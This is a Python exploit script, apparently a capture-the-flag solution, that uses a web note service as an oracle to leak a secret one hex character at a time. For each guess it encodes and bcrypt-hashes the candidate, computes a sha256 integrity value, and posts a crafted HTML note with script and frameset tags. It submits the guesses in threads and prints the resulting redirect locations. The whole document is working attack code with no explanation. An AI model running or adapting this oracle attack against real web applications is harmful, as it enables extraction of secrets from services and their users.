#!/usr/bin/env python3
import sys
import requests
import bcrypt
import base64
import hashlib
import threading

def urlenc(v):
	s = ''
	for i in v:
		s += '%'+hex(i)[2:]
	return s

rrrr = [
[0, 4, 2, 1, 2, 2],
[3, 0, 2, 0, 4, 3],
[0, 4, 2, 0, 0, 4],
[2, 0, 4, 2, 4, 4],
[1, 1, 1, 0, 2],
[4, 2, 2, 4, 1],
[2, 4, 1, 3, 4, 3],
[3, 2, 1, 4, 1, 4],
[1, 4, 4, 2, 0],
[4, 1, 1, 2, 1],
[3, 1, 4, 4, 2],
[4, 4, 0, 2, 4],
]
out = []
salt = sys.argv[1].encode()
ops = [
	lambda x:x.hex().encode(),
	lambda x:base64.b64encode(x),
	lambda x:urlenc(x).encode(),
	lambda x:base64.b32encode(x),
	lambda x:x,
]
funcs = ['hex_encode','base64_encode','URL_encode','base32_encode','']


s = requests.session()
ff = {}
known = sys.argv[4]
def doit(c):
	tochk = known+c
	tpath = ''
	for i in rrrr[len(known)]:
		if(funcs[i] == ''):
			continue
		tpath += funcs[i]+'/'
	tpath += 'bcrypt/'

	q = tochk.encode()
	for i in rrrr[len(known)]:
		q = ops[i](q)
	q = bcrypt.hashpw(q,salt) 
	q = b'<style>body {overflow-wrap: anywhere;font-family: sans-serif;color: white;font-size: 18px;}</style>'+q
	q = base64.b64encode(hashlib.sha256(q).digest()).decode()
	tosubmit = f"""
		<link id="submit-button">
		<div>
		<script id="results-frame" src="/view/{sys.argv[3]}/render/{tpath}" integrity="sha256-{q}" defer async ></script>
		<script src="/js/view.js"></script>
		<frameset>
		<frame id="results-frame" src="/js/view.js"></frame>
		</frameset>
	"""

	r = s.post(f'{sys.argv[2]}/',data={'note':tosubmit},allow_redirects=False)
	ff[tochk]= r.headers['Location']+'render/'
z = []
for i in 'abcdef0123456789':
	x = threading.Thread(target=doit, args=(i,))
	z.append(x)
	x.start()
for i in z:
	i.join()
import json
print(json.dumps(ff))



